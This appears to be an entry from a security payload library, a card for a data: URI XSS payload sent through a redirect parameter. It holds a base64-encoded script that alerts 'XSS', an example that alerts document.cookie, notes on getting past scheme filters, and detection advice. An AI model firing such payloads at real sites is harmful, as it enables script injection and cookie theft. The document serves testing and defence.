---
id: 6ae396ba-9a8e-430d-ad66-728c0b9632d8
type: code
language: url-payload
verified: true
created_at: '2023-04-06T03:56:31.798810+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
tags:
  - data-uri
  - xss
  - base64
validated: true
---

# Data-URI-Base64-XSS-Redirect

## Code

```url-payload
http://www.example.com/redirect.php?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==
```

## Description

Base64-encodes HTML with JS for data: URI, bypassing URL scheme filters.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| base64,... | Encoded HTML/JS | PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpOzwvc2NyaXB0Pg== |

## Usage

Direct in redirect param for inline execution.

## Detection

- Block data: URIs in redirects.
- Decode and scan base64 content.

## Related

- [[procedures/Bypass-Open-URL-Redirection-Filters]]
